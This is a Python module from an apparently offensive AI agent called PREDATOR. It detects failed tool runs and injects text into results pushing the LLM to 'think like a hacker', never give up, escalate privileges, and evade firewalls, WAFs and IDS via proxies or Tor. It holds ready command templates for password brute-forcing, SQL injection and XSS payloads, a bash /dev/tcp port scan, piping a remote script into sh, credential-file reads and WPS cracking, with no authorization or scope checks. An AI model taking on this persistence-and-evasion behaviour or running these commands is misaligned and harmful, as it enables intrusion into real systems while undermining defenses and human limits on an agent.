"""Auto-Escalation Loop — the PREDATOR brain's persistence engine.

When a tool fails or returns nothing useful, PREDATOR doesn't stop.
It LOOPS:
  1. Tool fails/returns empty → DETECT the failure
  2. THINK about why it failed → analyze error, context, goal
  3. FIND alternatives → different tool, different approach, different params
  4. TRY the alternative → execute it
  5. If something is found → PUSH THROUGH (dig deeper, pivot, escalate)
  6. If it breaks again → LOOP BACK to step 2

This is how real hackers think: they don't stop at the first "not found".
They pivot, try different angles, chain tools, and keep pushing.

The escalation loop injects "meta-reasoning" into the tool result before
it goes back to the LLM, guiding the model to think like a hacker.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Optional

from predator.utils.logger import get_logger

log = get_logger("agents.escalation_loop")


# ─── Failure Patterns ──────────────────────────────────────────────────
# Patterns that indicate a tool failed or returned nothing useful.

FAILURE_PATTERNS: list[tuple[str, str]] = [
    # Command not found → auto-install
    (r"command not found", "tool_missing"),
    (r"not found", "tool_missing"),
    (r"No such file or directory.*bin/", "tool_missing"),
    (r"not installed", "tool_missing"),
    (r"package .* is not installed", "tool_missing"),

    # Permission denied → need escalation
    (r"permission denied", "permission_denied"),
    (r"Operation not permitted", "permission_denied"),
    (r"Access denied", "permission_denied"),
    (r"requires root", "permission_denied"),
    (r"must be root", "permission_denied"),
    (r"EACCES", "permission_denied"),

    # Network errors → connectivity/firewall issues
    (r"connection refused", "network_error"),
    (r"connection timed out", "network_error"),
    (r"Network is unreachable", "network_error"),
    (r"No route to host", "network_error"),
    (r"Could not resolve host", "network_error"),
    (r"Name or service not known", "network_error"),
    (r"Connection reset by peer", "network_error"),

    # Empty results → need different approach
    (r"^$", "empty_result"),
    (r"no results", "empty_result"),
    (r"0 hosts? up", "empty_result"),
    (r"nothing found", "empty_result"),
    (r"no records found", "empty_result"),
    (r"no matches", "empty_result"),
    (r"0 results", "empty_result"),

    # Rate limiting → slow down or use different source
    (r"rate limit", "rate_limited"),
    (r"too many requests", "rate_limited"),
    (r"429", "rate_limited"),
    (r"quota exceeded", "rate_limited"),
    (r"throttl", "rate_limited"),

    # Auth errors → need API key or creds
    (r"401", "auth_error"),
    (r"403", "auth_error"),
    (r"unauthorized", "auth_error"),
    (r"forbidden", "auth_error"),
    (r"invalid.*api.*key", "auth_error"),
    (r"authentication failed", "auth_error"),

    # Timeout → target may be filtered or slow
    (r"timed out", "timeout"),
    (r"timeout", "timeout"),

    # Blocked/filtered → need to try a different way
    (r"filtered", "blocked"),
    (r"blocked", "blocked"),
    (r"firewall", "blocked"),
    (r"WAF", "blocked"),
    (r"captcha", "blocked"),
]


# ─── Alternative Tool Chains ──────────────────────────────────────────
# When tool X fails, what are the alternatives?
# Maps tool categories to chains of alternatives.

TOOL_ALTERNATIVES: dict[str, list[dict[str, Any]]] = {
    # Port scanning alternatives
    "port_scan": [
        {"tool": "nmap", "args": "-sS -T4", "desc": "SYN scan"},
        {"tool": "nmap", "args": "-sT -T3", "desc": "TCP connect scan (no root needed)"},
        {"tool": "nmap", "args": "-sU -T4 --top-ports 100", "desc": "UDP scan"},
        {"tool": "nmap", "args": "-Pn -sS", "desc": "Skip host discovery"},
        {"tool": "masscan", "args": "-p1-65535 --rate=1000", "desc": "Fast full port scan"},
        {"tool": "naabu", "args": "-top-ports 1000", "desc": "Fast port scan"},
        {"tool": "bash", "cmd": "for port in $(seq 1 1000); do (echo >/dev/tcp/{target}/$port) 2>/dev/null && echo \"$port open\"; done", "desc": "Bash port scan fallback"},
    ],

    # Subdomain enumeration alternatives
    "subdomain_enum": [
        {"tool": "subfinder", "args": "-d {domain}", "desc": "Passive subdomain finder"},
        {"tool": "amass", "args": "enum -passive -d {domain}", "desc": "OWASP Amass passive"},
        {"tool": "amass", "args": "enum -active -d {domain}", "desc": "OWASP Amass active"},
        {"tool": "assetfinder", "args": "--subs-only {domain}", "desc": "Asset finder"},
        {"tool": "theharvester", "args": "-d {domain} -b all", "desc": "theHarvester all sources"},
        {"tool": "dnsrecon", "args": "-d {domain} -t brt", "desc": "DNS brute force"},
        {"tool": "dnsenum", "args": "{domain}", "desc": "DNS enumeration"},
        {"tool": "fierce", "args": "--domain {domain}", "desc": "Fierce DNS recon"},
        {"tool": "bash", "cmd": "curl -s 'https://crt.sh/?q=%25.{domain}&output=json' | jq -r '.[].name_value' | sort -u", "desc": "Certificate transparency"},
    ],

    # Directory brute-forcing alternatives
    "dir_bruteforce": [
        {"tool": "gobuster", "args": "dir -u {url} -w /usr/share/wordlists/dirb/common.txt", "desc": "Gobuster directory scan"},
        {"tool": "ffuf", "args": "-u {url}/FUZZ -w /usr/share/wordlists/dirb/common.txt", "desc": "ffuf fuzzing"},
        {"tool": "dirb", "args": "{url}", "desc": "DIRB scan"},
        {"tool": "dirsearch", "args": "-u {url}", "desc": "Dirsearch"},
        {"tool": "wfuzz", "args": "-c -z file,/usr/share/wordlists/dirb/common.txt {url}/FUZZ", "desc": "WFuzz"},
        {"tool": "nikto", "args": "-h {url}", "desc": "Nikto web scan"},
    ],

    # Vulnerability scanning alternatives
    "vuln_scan": [
        {"tool": "nuclei", "args": "-u {target} -as", "desc": "Nuclei auto-scan"},
        {"tool": "nikto", "args": "-h {target}", "desc": "Nikto scan"},
        {"tool": "nmap", "args": "--script vuln {target}", "desc": "Nmap vuln scripts"},
        {"tool": "nmap", "args": "--script=http-vuln* {target}", "desc": "Nmap HTTP vuln scripts"},
        {"tool": "searchsploit", "args": "{service_name}", "desc": "SearchSploit lookup"},
        {"tool": "wpscan", "args": "--url {target} --enumerate vp", "desc": "WordPress vuln scan"},
    ],

    # Password attacks alternatives
    "password_attack": [
        {"tool": "hydra", "args": "-L users.txt -P pass.txt {target} {service}", "desc": "Hydra brute force"},
        {"tool": "medusa", "args": "-h {target} -U users.txt -P pass.txt -M {service}", "desc": "Medusa brute force"},
        {"tool": "ncrack", "args": "-p {port} -U users.txt -P pass.txt {target}", "desc": "Ncrack"},
        {"tool": "patator", "args": "{service}_login host={target} user=FILE0 password=FILE1 0=users.txt 1=pass.txt", "desc": "Patator"},
        {"tool": "crackmapexec", "args": "{service} {target} -u users.txt -p pass.txt", "desc": "CrackMapExec"},
    ],

    # OSINT email alternatives
    "email_osint": [
        {"tool": "theharvester", "args": "-d {domain} -b all", "desc": "theHarvester"},
        {"tool": "h8mail", "args": "-t {email}", "desc": "h8mail breach check"},
        {"tool": "bash", "cmd": "curl -s 'https://hunter.io/v2/domain-search?domain={domain}&api_key={api_key}' | jq '.data.emails[]'", "desc": "Hunter.io API"},
        {"tool": "sherlock", "args": "{username}", "desc": "Username search"},
    ],

    # Web technology detection alternatives
    "web_tech": [
        {"tool": "whatweb", "args": "{url}", "desc": "WhatWeb fingerprint"},
        {"tool": "httpx", "args": "-u {url} -tech-detect", "desc": "httpx tech detect"},
        {"tool": "wafw00f", "args": "{url}", "desc": "WAF detection"},
        {"tool": "nmap", "args": "-sV -p80,443 {target}", "desc": "Service version scan"},
        {"tool": "curl", "args": "-sI {url}", "desc": "HTTP headers"},
    ],

    # SMB/Windows enumeration alternatives
    "smb_enum": [
        {"tool": "enum4linux", "args": "-a {target}", "desc": "enum4linux full"},
        {"tool": "smbclient", "args": "-L //{target}/ -N", "desc": "SMB share listing"},
        {"tool": "crackmapexec", "args": "smb {target} --shares", "desc": "CME shares"},
        {"tool": "rpcclient", "args": "-U '' -N {target}", "desc": "RPC null session"},
        {"tool": "nmap", "args": "--script smb-enum* {target}", "desc": "Nmap SMB scripts"},
        {"tool": "impacket-smbserver", "args": "", "desc": "Impacket SMB"},
    ],

    # SQL injection alternatives
    "sqli": [
        {"tool": "sqlmap", "args": "-u '{url}' --batch --dbs", "desc": "SQLMap auto"},
        {"tool": "sqlmap", "args": "-u '{url}' --batch --tamper=space2comment", "desc": "SQLMap with tamper"},
        {"tool": "commix", "args": "-u '{url}'", "desc": "Commix command injection"},
        {"tool": "bash", "cmd": "curl -s '{url}' -d \"id=1' OR '1'='1\"", "desc": "Manual SQLi test"},
    ],

    # XSS alternatives
    "xss": [
        {"tool": "dalfox", "args": "url {url}", "desc": "DalFox XSS scan"},
        {"tool": "xsser", "args": "-u {url}", "desc": "XSSer scan"},
        {"tool": "bash", "cmd": "curl -s '{url}' -d 'input=<script>alert(1)</script>'", "desc": "Manual XSS test"},
    ],

    # Wireless alternatives
    "wireless": [
        {"tool": "aircrack-ng", "args": "", "desc": "Aircrack-ng suite"},
        {"tool": "wifite", "args": "", "desc": "Wifite automated"},
        {"tool": "reaver", "args": "-i {iface} -b {bssid}", "desc": "Reaver WPS"},
        {"tool": "bully", "args": "-b {bssid} -c {channel} {iface}", "desc": "Bully WPS"},
    ],

    # Privilege escalation alternatives
    "privesc": [
        {"tool": "bash", "cmd": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh", "desc": "LinPEAS"},
        {"tool": "bash", "cmd": "find / -perm -4000 -type f 2>/dev/null", "desc": "Find SUID binaries"},
        {"tool": "bash", "cmd": "find / -writable -type f 2>/dev/null | head -50", "desc": "Find writable files"},
        {"tool": "bash", "cmd": "cat /etc/crontab && ls -la /etc/cron*", "desc": "Check cron jobs"},
        {"tool": "bash", "cmd": "sudo -l 2>/dev/null", "desc": "Check sudo permissions"},
        {"tool": "bash", "cmd": "cat /etc/passwd | grep -v nologin | grep -v false", "desc": "Check users with login"},
        {"tool": "bash", "cmd": "netstat -tlnp 2>/dev/null || ss -tlnp", "desc": "Check listening services"},
        {"tool": "bash", "cmd": "uname -a && cat /etc/os-release", "desc": "Kernel/OS info for exploit search"},
    ],
}


# ─── Escalation Strategies per Failure Type ────────────────────────────

ESCALATION_STRATEGIES: dict[str, dict[str, Any]] = {
    "tool_missing": {
        "action": "auto_install",
        "message": (
            "TOOL NOT FOUND. PREDATOR is auto-installing it now. "
            "After install, retry the same command."
        ),
        "retry": True,
    },
    "permission_denied": {
        "action": "escalate_privileges",
        "message": (
            "PERMISSION DENIED. Try with elevated privileges (sudo). "
            "If that fails, look for alternative approaches that don't need root. "
            "Check: SUID binaries, capabilities, cron jobs, writable configs."
        ),
        "alternatives": [
            "Try the same command with 'elevated: true' (sudo)",
            "Look for SUID binaries: find / -perm -4000 2>/dev/null",
            "Check sudo permissions: sudo -l",
            "Look for writable sensitive files",
            "Try a different tool that doesn't need root",
        ],
        "retry": True,
    },
    "network_error": {
        "action": "try_alternative_approach",
        "message": (
            "NETWORK ERROR. The target may be down, filtered, or blocking you. "
            "Try: different port, different protocol, different source, slower scan rate. "
            "Check if you're being blocked by a firewall/IDS."
        ),
        "alternatives": [
            "Retry with slower timing (-T2 or --scan-delay)",
            "Try a different source port (--source-port 53)",
            "Use a different protocol (UDP instead of TCP)",
            "Check if target is behind a CDN/WAF",
            "Try accessing via IPv6 instead of IPv4",
            "Use proxychains or tor for anonymity",
        ],
        "retry": True,
    },
    "empty_result": {
        "action": "try_alternative_tool",
        "message": (
            "NO RESULTS FOUND. This doesn't mean there's nothing — it means this "
            "tool/approach didn't find anything. A real hacker tries multiple tools "
            "and angles. Try a completely different approach."
        ),
        "retry": True,
    },
    "rate_limited": {
        "action": "slow_down_and_retry",
        "message": (
            "RATE LIMITED. Slow down the scan rate, add delays between requests, "
            "or switch to a different data source. Consider using an API key."
        ),
        "alternatives": [
            "Add delay: --scan-delay 2s or -T2",
            "Use a different data source or API",
            "Switch to passive reconnaissance",
            "Use proxychains to rotate IPs",
        ],
        "retry": True,
    },
    "auth_error": {
        "action": "check_credentials",
        "message": (
            "AUTHENTICATION ERROR. Check API keys, credentials, or access tokens. "
            "Try a source that doesn't require authentication."
        ),
        "alternatives": [
            "Check if API key is set in config",
            "Try a free/public alternative",
            "Use passive recon that doesn't need auth",
        ],
        "retry": True,
    },
    "timeout": {
        "action": "adjust_timing",
        "message": (
            "TIMEOUT. Target may be slow, filtered, or rate-limiting. "
            "Increase timeout, reduce parallelism, or try a different approach."
        ),
        "alternatives": [
            "Increase timeout: --timeout 60",
            "Reduce parallelism: --max-parallelism 2",
            "Skip host discovery: -Pn",
            "Try a faster tool (masscan vs nmap)",
        ],
        "retry": True,
    },
    "blocked": {
        "action": "bypass_detection",
        "message": (
            "BLOCKED/FILTERED. Target has active defenses (firewall, WAF, IDS). "
            "Try evasion techniques: fragmentation, encoding, slower timing, "
            "different user-agent, or approach from a different angle."
        ),
        "alternatives": [
            "Use nmap evasion: -f --data-length 24 -T2",
            "Change User-Agent header",
            "Use WAF bypass techniques",
            "Try from a different IP/proxy",
            "Use encoded payloads",
            "Switch to a passive approach",
        ],
        "retry": True,
    },
}


@dataclass
class EscalationContext:
    """Context for an escalation decision."""

    tool_name: str
    tool_args: dict[str, Any]
    tool_output: str
    is_error: bool
    failure_type: str = ""
    strategy: Optional[dict[str, Any]] = None
    alternatives_tried: list[str] = field(default_factory=list)
    escalation_count: int = 0
    max_escalations: int = 5
    goal: str = ""  # What the user is trying to achieve


class EscalationLoop:
    """The PREDATOR auto-escalation engine.

    Analyzes tool failures, determines the failure type, and injects
    escalation guidance into the conversation so the LLM knows to
    try alternative approaches automatically.

    This is NOT a simple retry — it's a THINKING loop:
    - Understand WHY it failed
    - Know WHAT alternatives exist
    - Guide the LLM to try them
    - Track what's been tried to avoid loops
    - Push through when something works (dig deeper)
    """

    def __init__(self) -> None:
        self._history: list[EscalationContext] = []
        self._tools_tried: dict[str, list[str]] = {}  # goal → [tools tried]

    def detect_failure(self, tool_name: str, output: str, is_error: bool) -> Optional[str]:
        """Detect what type of failure occurred.

        Returns the failure type string, or None if no failure detected.
        """
        if not is_error and output and len(output.strip()) > 10:
            # Check for soft failures (tool ran but found nothing)
            for pattern, failure_type in FAILURE_PATTERNS:
                if failure_type == "empty_result" and re.search(pattern, output, re.IGNORECASE):
                    return "empty_result"
            return None  # Tool succeeded with real output

        # Check hard failures
        check_text = output.lower() if output else ""
        for pattern, failure_type in FAILURE_PATTERNS:
            if re.search(pattern, check_text, re.IGNORECASE):
                return failure_type

        if is_error:
            return "unknown_error"

        if not output or not output.strip():
            return "empty_result"

        return None

    def get_escalation_guidance(
        self,
        tool_name: str,
        tool_args: dict[str, Any],
        output: str,
        is_error: bool,
        goal: str = "",
    ) -> Optional[str]:
        """Generate escalation guidance to inject into the tool result.

        This is the key method — it returns additional text that gets
        appended to the tool result, guiding the LLM to think like a
        hacker and try alternatives.

        Returns None if no escalation is needed (tool succeeded).
        """
        failure_type = self.detect_failure(tool_name, output, is_error)
        if failure_type is None:
            return None

        # Track this attempt
        ctx = EscalationContext(
            tool_name=tool_name,
            tool_args=tool_args,
            tool_output=output[:500],
            is_error=is_error,
            failure_type=failure_type,
            goal=goal,
            escalation_count=len(self._history),
        )

        strategy = ESCALATION_STRATEGIES.get(failure_type, ESCALATION_STRATEGIES.get("empty_result"))
        ctx.strategy = strategy
        self._history.append(ctx)

        # Build the escalation guidance
        guidance_parts = [
            f"\n\n{'='*60}",
            f"[PREDATOR ESCALATION ENGINE — Failure #{len(self._history)}]",
            f"Failure type: {failure_type}",
            f"Tool: {tool_name}",
        ]

        if strategy:
            guidance_parts.append(f"\n{strategy['message']}")

            if "alternatives" in strategy:
                guidance_parts.append("\nAlternative approaches to try:")
                for i, alt in enumerate(strategy["alternatives"], 1):
                    guidance_parts.append(f"  {i}. {alt}")

        # Add tool-category-specific alternatives
        category_alts = self._find_category_alternatives(tool_name, tool_args)
        if category_alts:
            guidance_parts.append(f"\nTool alternatives for this task:")
            already_tried = set(self._get_tried_tools())
            for alt in category_alts:
                marker = " [ALREADY TRIED]" if alt.get("tool") in already_tried else ""
                guidance_parts.append(f"  → {alt['tool']} {alt.get('args', '')} — {alt['desc']}{marker}")

        # Add the meta-instruction
        guidance_parts.extend([
            f"\n{'='*60}",
            "[IMPORTANT: Do NOT give up. Try a different tool or approach.",
            "Think like a hacker — there's always another way.",
            "If you need a tool that's not installed, just use it — PREDATOR will auto-install it.",
            "After trying an alternative, if you find something, DIG DEEPER into it.]",
            f"{'='*60}\n",
        ])

        return "\n".join(guidance_parts)

    def get_push_through_guidance(
        self,
        tool_name: str,
        output: str,
    ) -> Optional[str]:
        """Generate 'push through' guidance when a tool SUCCEEDS after escalation.

        When something is found after previous failures, guide the LLM
        to dig deeper into the finding.
        """
        if not self._history:
            return None  # No previous failures, no need for push-through

        # Only trigger if we had failures before this success
        recent_failures = [h for h in self._history[-3:] if h.is_error or h.failure_type]
        if not recent_failures:
            return None

        return (
            f"\n[PREDATOR PUSH-THROUGH: After {len(recent_failures)} failed attempts, "
            f"'{tool_name}' found results. DIG DEEPER into these findings:\n"
            f"  1. Enumerate what was found\n"
            f"  2. Look for exploitable details\n"
            f"  3. Cross-reference with other data\n"
            f"  4. Chain this finding with previous discoveries\n"
            f"  5. Consider: what can you DO with this information?]\n"
        )

    def _find_category_alternatives(
        self, tool_name: str, tool_args: dict[str, Any]
    ) -> list[dict[str, Any]]:
        """Find alternative tools based on what category the failed tool belongs to."""
        # Map tool names to categories
        tool_to_category: dict[str, str] = {
            "nmap": "port_scan", "masscan": "port_scan", "naabu": "port_scan",
            "subfinder": "subdomain_enum", "amass": "subdomain_enum",
            "assetfinder": "subdomain_enum", "theharvester": "subdomain_enum",
            "dnsrecon": "subdomain_enum", "dnsenum": "subdomain_enum",
            "gobuster": "dir_bruteforce", "ffuf": "dir_bruteforce",
            "dirb": "dir_bruteforce", "dirsearch": "dir_bruteforce",
            "nuclei": "vuln_scan", "nikto": "vuln_scan", "nmap_vuln": "vuln_scan",
            "hydra": "password_attack", "medusa": "password_attack",
            "ncrack": "password_attack", "patator": "password_attack",
            "sqlmap": "sqli", "commix": "sqli",
            "dalfox": "xss", "xsser": "xss",
            "whatweb": "web_tech", "httpx": "web_tech",
            "enum4linux": "smb_enum", "smbclient": "smb_enum",
            "crackmapexec": "smb_enum",
            "aircrack-ng": "wireless", "wifite": "wireless",
            "h8mail": "email_osint", "sherlock": "email_osint",
        }

        category = tool_to_category.get(tool_name)
        if not category:
            return []

        alternatives = TOOL_ALTERNATIVES.get(category, [])
        # Filter out the tool that just failed
        return [a for a in alternatives if a.get("tool") != tool_name]

    def _get_tried_tools(self) -> list[str]:
        """Get list of tools that have been tried in this session."""
        return [h.tool_name for h in self._history]

    def reset(self) -> None:
        """Reset escalation history."""
        self._history.clear()
        self._tools_tried.clear()

    @property
    def escalation_count(self) -> int:
        return len(self._history)

    @property
    def history(self) -> list[EscalationContext]:
        return self._history
